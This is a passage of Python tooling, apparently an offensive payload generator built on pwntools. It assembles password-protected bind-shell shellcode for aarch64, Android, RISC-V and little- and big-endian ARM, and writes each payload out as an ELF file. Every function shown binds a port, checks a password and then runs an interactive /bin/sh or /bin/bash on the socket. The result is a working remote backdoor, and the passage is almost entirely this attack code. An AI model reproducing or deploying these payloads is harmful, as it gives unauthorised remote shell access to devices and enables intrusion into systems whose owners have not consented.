	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd_high = passwd[:6]
	passwd_high2 = '0x'+passwd[6:10]
	passwd_low = '0x' + passwd[10:14]
	passwd_low2 = '0x' + passwd[14:]
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
/* push b'/bin/bash\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
/* push b'/bin/bash\x00-i\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
/* Set x15 = 1764556904 = 0x692d0068 */
mov  x15, #104
movk x15, #26925, lsl #16
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #18
add x14, sp, x14
sub sp, sp ,8
str x14, [sp, #-8]!
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
stp x5, x14 , [sp, #-8]!

add x1, sp, 8

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve ='''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #16
add x14, sp, x14
sub sp, sp, 8

str x14, [sp, #-8]! /* b'/bin/sh\x00' */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	
	shellcode += shellcraft.clone(0x1200011)

	shellcode += '''
mov x11, x0
cmp w0, #0
b.ne main_lab
	'''

	shellcode += '''
	mov x8, #198
	lsr x1, x8, #7
	lsl x0, x1, #1
	mov x2, xzr
	svc #0x1337
	mvn x10, x0
	'''

	shellcode += shellcraft.setsockopt("x0",1,0xf,"sp",4)

	shellcode += '''
	eor  x2, x2, x2
	lsl  x1, x1, #1
	movk x1, #%s , lsl #16
	str  x1, [sp, #-8]!
	add  x1, sp, x2
	mov  x2, #16
	mvn  x0, x10
	mov  x8, #200
	svc #0x1337

	mvn  x0, x10
	lsr  x1, x2, #3
	mov  x8, #201
	svc #0x1337
	mov x5, x1

	mvn  x0, x10
	mov  x1, xzr
	mov  x2, xzr
	mov  x8, #202
	svc  #0x1337


	mvn  x4, x0
	lsl  x1, x5, #1
	mvn  x4, x0
	lsr  x1, x1, #1
	mov  x2, xzr
	mov  x8, #24
	svc  #0x1337
	mov  x10, xzr
	cmp  x10, x1
	bne  -0x18
	mov  x14, #24912
	movk x14, #29555, lsl #16
	movk x14, #25719, lsl #0x20
	movk x14, #8250, lsl #0x30
	mov  x15, xzr
	sub  sp, sp, #8
	stp x14, x15, [sp, #-16]!
	mov  x1, sp
	mvn  x0, x4
	mov  x2, #8
	/* call write() */
	mov  x8, #SYS_write
	svc 0

	sub sp, sp, 0x30
	mvn x0, x4
	mov x1, sp
	mov x2, #%s
	mov x8, #0x3f
	svc #0x1337

	mov x14, #%s
	movk x14, #%s , lsl #16
	movk x14, #%s , lsl #0x20
	movk x14, #%s , lsl #0x30

	ldr x15, [sp,#0]!
	cmp x15, x14
	bne main_exit
	'''

	shellcode = shellcode % (listen_port, passwd_len, passwd_low2, passwd_low, passwd_high2, passwd_high)


	shellcode += shellcode_execve

	shellcode += '''
main_exit:
	'''
	
	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("x11")

	shellcode += '''
b _start
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def android_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'aarch64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd_high = passwd[:6]
	passwd_high2 = '0x'+passwd[6:10]
	passwd_low = '0x' + passwd[10:14]
	passwd_low2 = '0x' + passwd[14:]
	shell_path_list = []

	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
/* push b'/bin/bash\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
/* push b'/bin/bash\x00-i\x00' */
/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #25135, lsl #0x20
movk x14, #29537, lsl #0x30
/* Set x15 = 1764556904 = 0x692d0068 */
mov  x15, #104
movk x15, #26925, lsl #16
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #18
add x14, sp, x14
sub sp, sp ,8
str x14, [sp, #-8]!
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
stp x5, x14 , [sp, #-8]!

add x1, sp, 8

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve ='''
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
str x14, [sp, #-16]!
mov  x0, sp
/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
/* push b'/bin/sh\x00-i\x00' */
/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #29487, lsl #0x20
movk x14, #104, lsl #0x30
mov  x15, #26925
stp x14, x15, [sp, #-16]!

/* push null terminator */
mov  x14, xzr
str x14, [sp, #-8]!

/* push pointers onto the stack */
mov  x14, #16
add x14, sp, x14
sub sp, sp, 8

str x14, [sp, #-8]! /* b'/bin/sh\x00' */
mov  x14, #24
add x14, sp, x14
sub sp, sp, 8
str x14, [sp, #0]! /* b'-i\x00' */

mov x1, sp

/* set x1 to the current top of the stack */
mov  x2, xzr
/* call execve() */
mov  x8, #0xdd
svc 0

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
	'''
	
	shellcode += shellcraft.clone(0x1200011)

	shellcode += '''
mov x11, x0
cmp w0, #0
b.ne main_lab
	'''

	shellcode += '''
	mov x8, #198
	lsr x1, x8, #7
	lsl x0, x1, #1
	mov x2, xzr
	svc #0x1337
	mvn x10, x0
	'''

	shellcode += shellcraft.setsockopt("x0",1,0xf,"sp",4)

	shellcode += '''
	eor  x2, x2, x2
	lsl  x1, x1, #1
	movk x1, #%s , lsl #16
	str  x1, [sp, #-8]!
	add  x1, sp, x2
	mov  x2, #16
	mvn  x0, x10
	mov  x8, #200
	svc #0x1337

	mvn  x0, x10
	lsr  x1, x2, #3
	mov  x8, #201
	svc #0x1337
	mov x5, x1

	mvn  x0, x10
	mov  x1, xzr
	mov  x2, xzr
	mov  x8, #202
	svc  #0x1337


	mvn  x4, x0
	lsl  x1, x5, #1
	mvn  x4, x0
	lsr  x1, x1, #1
	mov  x2, xzr
	mov  x8, #24
	svc  #0x1337
	mov  x10, xzr
	cmp  x10, x1
	bne  -0x18
	mov  x14, #24912
	movk x14, #29555, lsl #16
	movk x14, #25719, lsl #0x20
	movk x14, #8250, lsl #0x30
	mov  x15, xzr
	sub  sp, sp, #8
	stp x14, x15, [sp, #-16]!
	mov  x1, sp
	mvn  x0, x4
	mov  x2, #8
	/* call write() */
	mov  x8, #SYS_write
	svc 0

	sub sp, sp, 0x30
	mvn x0, x4
	mov x1, sp
	mov x2, #%s
	mov x8, #0x3f
	svc #0x1337

	mov x14, #%s
	movk x14, #%s , lsl #16
	movk x14, #%s , lsl #0x20
	movk x14, #%s , lsl #0x30

	ldr x15, [sp,#0]!
	cmp x15, x14
	bne main_exit
	'''

	shellcode = shellcode % (listen_port, passwd_len, passwd_low2, passwd_low, passwd_high2, passwd_high)


	shellcode += shellcode_execve

	shellcode += '''
main_exit:
	'''
	
	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("x11")

	shellcode += '''
b _start
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


'''
0xc8 bind
0xc9 listen
0xca accept
0xd0 setsockopt
0x24 dup2
0x40 wirte
0x3f read
'''

def riscv64_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'riscv'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port="0x"+enhex(p16(listen_port))+"0002"
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shellcode = '''
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
li a0,0x1200011
li a2,0
li a1,0
li a7,0xdc
ecall
mv s7,a0
sext.w s7, s7
bnez   s7, main_lab
'''

	shellcode += '''
li  a0,2
li  a1,1
li  a2,0
li  a7,0xc6
ecall
mv  a6, a0
	'''

	shellcode += '''
li  a1,1
li  a2,0xf
add a3,sp,0
li  a4,4
li  a7,0xd0
ecall
	'''

	shellcode += '''
xor a2,a2,a2
xor a3,a3,a3
xor a1,a1,a1
xor a4,a4,a4
mv a0, a6
li  s1, %s
sd  s1,-16(sp)
li  s1, 0
sd  s1, -8(sp)
add a1,sp,-16
li  a2, 0x10
li  a7, 0xc8
ecall
mv  a0, a6
li  a1, 0x20
li  a7, 0xc9
ecall
mv  a0, a6
li  a1, 0
li  a2, 0
li  a7, 0xca
ecall

mv  a6, a0
li  a1, 0
li  a2, 0
li  a7, 24
ecall

mv  a0, a6
li  a1, 1
li  a2, 0
li  a7, 24
ecall

mv  a0, a6
li  a1, 2
li  a2, 0
li  a7, 24
ecall

add sp, sp, -0x20
li  s1, 0x203a647773736150
sd  s1, 0(sp)
add  a1, sp, 0
mv  a0, a6
li  a2, 8
li  a7, 0x40
ecall

li  s9, %s

add sp, sp, -0x40
mv  a1, sp
mv  a0, a6
li  a2, %s
li  a7, 0x3f
ecall

ld  s8, 0(sp)
sext.w s8, s8
sext.w s9, s9
bne    s8, s9, main_exit
	'''

	shellcode = shellcode%(listen_port, passwd, passwd_len)

	if shell_path == "/bin/sh" or shell_path == "bash":
		shellcode += '''
li s1, 0x68732f2f6e69622f
sd s1, -48(sp)
li s1, 0x692d
sd s1, -64(sp)
addi a0,sp,-48
sd a0, -16(sp)
addi a5,sp,-64
sd a5, -8(sp)
sd zero, 0(sp)
addi a1,sp,-16
slt a2,zero,-1 
li a7, 221
ecall
		'''

	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode += '''
li s1, 0x687361622f6e6962
sd s1, -16(sp)
li s1, 0x2f00000000000000
sd s1, -24(sp)
li s1, 0x692d
sd s1, -32(sp)
sd zero, -8(sp)
addi a0,sp,-17
sd a0, -64(sp)
addi a5,sp,-32
sd a5, -56(sp)
add a1,sp,-64
slt a2,zero,-1
li a7, 221
ecall
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	
	shellcode +='''
main_exit:
li a0, 0 
li a7, 0x53
ecall
	'''

	shellcode += '''
main_lab:
mv a0,s7
li a1,0
li a2,0
li a3,0
li a7,0x104
ecall
j _start
	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'arm'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )

	bind_shellcode = 'mov  r6, r0'
	for i in range(2):
		bind_shellcode += '''
		mov  r7,%d
		strb  r7,[sp,#-%d]
		'''%(p16(listen_port)[i], 0x60+i)
	bind_shellcode += '''
	strb r2,[sp, #-0x62]
	mov r7, #2
	strb r7,[sp, #-0x63]	
	ldr r7,[sp, #-0x63]
	push {r2}
	push {r7}
	'''

	

	passwd_len_int = len(passwd)
	passwd_len = hex(len(passwd))
	passwd_cmd = p32(int("0x"+enhex(passwd.encode()),16))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")

	pass_cmd_shellcode = 'eor r7, r7, r7'

	if(passwd_len_int >0 and passwd_len_int <=4):
		for i in range(4-passwd_len_int):
			pass_cmd_shellcode += '''
			strb r7 , [sp, #-%d]
			'''%(0x80+i)

	for i in range(passwd_len_int):
		pass_cmd_shellcode += '''
		mov r7, #%d
		strb r7, [sp, #-%d]
		'''%(passwd_cmd[i],0x80+i+(4-passwd_len_int))

	pass_cmd_shellcode += '''
	ldr r5, [sp, #-0x83]
	'''


	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode = '''
		.section .shellcode,"awx"
		.global _start
		.global __start
		.p2align 2
		_start:
		__start:
		.syntax unified
		.arch armv7-a
		.ARM
		strb r4,[sp,#-0x14]
		mov r7,#0x68
		strb r7,[sp,#-0x15]
		mov r7,#0x73
		strb r7,[sp,#-0x16]
		mov r7,#0x61
		strb r7,[sp,#-0x17]
		mov r7,#0x62
		strb r7,[sp,#-0x18]
		mov r7,#0x2f
		strb r7,[sp,#-0x19]
		mov r7,#0x6e
		strb r7,[sp,#-0x1a]
		mov r7,#0x69
		strb r7,[sp,#-0x1b]
		mov r7,#0x62
		strb r7,[sp,#-0x1c]
		mov r7,#0x2f
		strb r7,[sp,#-0x1d]
		eor r7, r7
		strb r7,[sp,#-0x1e]
		mov r7,#0x69
		strb r7,[sp,#-0x1f]
		mov r7,#0x2d
		strb r7,[sp,#-0x20]
		add r10,sp,#-0x1d
		add r5,sp,#-0x2c
		add r8,sp,#-0x20
		main:
		'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode='''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	.ARM
	eor r4,r4,r4
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r10,sp,#-0x1b
	add r5,sp,#-0x2c
	add r8,sp,#-0x20
	main:
	'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode += shellcraft.fork()

	shellcode += '''
	mov r11,r0
	cmp r11,#0
	bne main_lab
	'''

	shellcode += '''
	mov  r0, #2
    mov  r1, #1
    eor  r2, r2 ,r2/* 0 (#0) */
    /* call socket() */
    mov r7, #0xff /* 0x119 */
    add r7,r7,0x1a
    svc  #0
	'''

	shellcode

	shellcode += '''
	mov r6, r0
	'''

	shellcode +='''
	mov  r1, #1
	mov  r2, #0xf
	mov  r3, sp
	mov  r4, #4
	/* call setsockopt() */
	mov r7, #0xff
	add r7, r7,#39
	svc  0
	'''

	shellcode += '''
	eor  r2, r2, r2
	mov  r0, r6
	'''
	shellcode += bind_shellcode

	shellcode +='''
	mov  r1,sp
	mov  r2,#0x10  
	mov r7,#0xff
	add r7,r7,0x1b
	svc #0
	mov r0,r6
	eor r1,r1
	mov r7,#0xff
	add r7,r7,29
	svc #0
	mov r0,r6
	eor r2,r2
	mov r7, #0xff
	add r7,r7,30
	svc #0
	mov r6,r0

	mov r1,#2
	mov r0,r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	mov r0, r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	mov r0, r6
	mov r7, 63
	svc #0



	mov r7,#0x20
	strb r7,[sp,#-0x30]
	mov r7,#0x3a
	strb r7,[sp,#-0x31]
	mov r7,#0x64
	strb r7,[sp,#-0x32]
	mov r7,#0x77
	strb r7,[sp,#-0x33]
	mov r7,#0x73
	strb r7,[sp,#-0x34]
	mov r7,0x73
	strb r7,[sp,#-0x35]
	mov r7,0x61
	strb r7,[sp,#-0x36]
	mov r7,0x70
	strb r7,[sp,#-0x37]
	add r1,sp,-0x37
	mov r0,r6
	mov  r0, r6
	mov  r2, #8
	/* call write() */
	mov r7, #SYS_write /* 4 */
	svc  #0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov  r7,sp
	ldr  r1,[r7]
	'''

	shellcode += pass_cmd_shellcode

	shellcode += '''
	cmp  r1,r5
	bne  main_exit
	mov r0,r10
	eor r1,r1,r1
	eor r2,r2,r2
	strb r2, [sp,#0x20]
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #0
	'''
	shellcode = shellcode % (passwd_len)

	shellcode += '''
main_exit:
	'''

	shellcode += shellcraft.exit(0)
	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("r11")

	shellcode += '''
b main
nop

	'''
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
	context.arch = 'arm'
	context.endian = 'big'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )

	l_p =p16(listen_port)[::-1]

	bind_shellcode = ''
	for i in range(2):
		bind_shellcode += '''
		mov  r7,%d
		strb  r7,[sp,#-%d]
		'''%(l_p[i], 0x60+i)
	bind_shellcode += '''
	strb r2,[sp, #-0x63]
	mov r7, #2
	strb r7,[sp, #-0x62]	
	ldr r7,[sp, #-0x63]
	push {r2}
	push {r7}
	'''


	passwd_len_int = len(passwd)
	passwd_len = hex(len(passwd))
	passwd_cmd = p32(int("0x"+enhex(passwd.encode()),16))[::-1]
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
	pass_cmd_shellcode = 'eor r7, r7, r7'
	if(passwd_len_int >0 and passwd_len_int <=4):
		for i in range(4-passwd_len_int):
			pass_cmd_shellcode += '''
			strb r7 , [sp, #-%d]
			'''%(0x80+i)
	for i in range(passwd_len_int):
		pass_cmd_shellcode += '''
		mov r7, #%d
		strb r7, [sp, #-%d]
		'''%(passwd_cmd[i],0x80+i+(4-passwd_len_int))

	pass_cmd_shellcode += '''
	ldr r5, [sp, #-0x83]
	'''
	if shell_path == "/bin/sh" or shell_path =="sh":
		shellcode = '''
	.section .shellcode,"awx"
	.global _start
	.global __start
	.p2align 2
	_start:
	__start:
	.syntax unified
	.arch armv7-a
	.ARM
	eor r4,r4,r4
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r8,sp,#-0x20
	add r10,sp,#-0x1b
	add r5,sp,#-0x2c
	main:
	'''

	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode = '''
		.section .shellcode,"awx"
		.global _start
		.global __start
		.p2align 2
		_start:
		__start:
		.syntax unified
		.arch armv7-a
		.ARM
		strb r4,[sp,#-0x14]
		mov r7,#0x68
		strb r7,[sp,#-0x15]
		mov r7,#0x73
		strb r7,[sp,#-0x16]
		mov r7,#0x61
		strb r7,[sp,#-0x17]
		mov r7,#0x62
		strb r7,[sp,#-0x18]
		mov r7,#0x2f
		strb r7,[sp,#-0x19]
		mov r7,#0x6e
		strb r7,[sp,#-0x1a]
		mov r7,#0x69
		strb r7,[sp,#-0x1b]
		mov r7,#0x62
		strb r7,[sp,#-0x1c]
		mov r7,#0x2f
		strb r7,[sp,#-0x1d]
		eor r7, r7
		strb r7,[sp,#-0x1e]
		mov r7,#0x69
		strb r7,[sp,#-0x1f]
		mov r7,#0x2d
		strb r7,[sp,#-0x20]
		add r10,sp,#-0x1d
		add r5,sp,#-0x2c
		add r8,sp,#-0x20
		main:
		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)

	shellcode += shellcraft.fork()

	shellcode += '''
	mov r11,r0
	cmp r11,#0
	bne main_lab
	'''

	shellcode += '''
	mov  r0, #2
    mov  r1, #1
    eor  r2, r2 ,r2/* 0 (#0) */
    mov r7, #0xff /* 0x119 */
    add r7,r7,0x1a
    svc  #0
	'''

	shellcode += '''
	mov r6, r0
	'''

	shellcode += '''
	mov  r1, #1
	mov  r2, #0xf
	mov  r3, sp
	mov  r4, #4
	/* call setsockopt() */
	mov r7, #SYS_setsockopt /* 0x126 */
	svc  0

	'''

	shellcode += '''
	eor r2, r2,r2
	mov  r0, r6
	'''

	shellcode += bind_shellcode



	shellcode +='''
	mov  r1,sp
	mov  r2,#0x10  
	mov r7,#0xff
	add r7,r7,0x1b
	svc #0
	mov r0,r6
	eor r1,r1
	mov r7,#0xff
	add r7,r7,29
	svc #0
	mov r0,r6
	eor r2,r2
	mov r7, #0xff
	add r7,r7,30
	svc #0
	mov r6,r0

	mov r1,#2
	mov r0,r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	mov r0, r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	mov r0, r6
	mov r7, 63
	svc #0

	mov r7,#0x20
	strb r7,[sp,#-0x30]
	mov r7,#0x3a
	strb r7,[sp,#-0x31]
	mov r7,#0x64
	strb r7,[sp,#-0x32]
	mov r7,#0x77
	strb r7,[sp,#-0x33]
	mov r7,#0x73
	strb r7,[sp,#-0x34]
	mov r7,0x73
	strb r7,[sp,#-0x35]
	mov r7,0x61
	strb r7,[sp,#-0x36]
	mov r7,0x70
	strb r7,[sp,#-0x37]
	add r1,sp,-0x37
	mov r0,r6
	mov  r0, r6
	mov  r2, #8
	/* call write() */
	mov r7, #SYS_write /* 4 */
	svc  #0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov  r7,sp
	ldr  r1,[r7]
	'''

	shellcode += pass_cmd_shellcode

	shellcode += '''
	cmp  r1,r5
	'''

	shellcode = shellcode%(passwd_len)

	shellcode += '''
	bne main_exit
	'''

	shellcode += '''
	mov r0,r10
	eor r1,r1,r1
	eor r2,r2,r2
	strb r2, [sp,#0x20]
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #0
	'''

	shellcode += '''
	main_exit:
	'''

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4("r11")

	shellcode += '''
b main
nop
	'''

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode,filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def powerpc_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
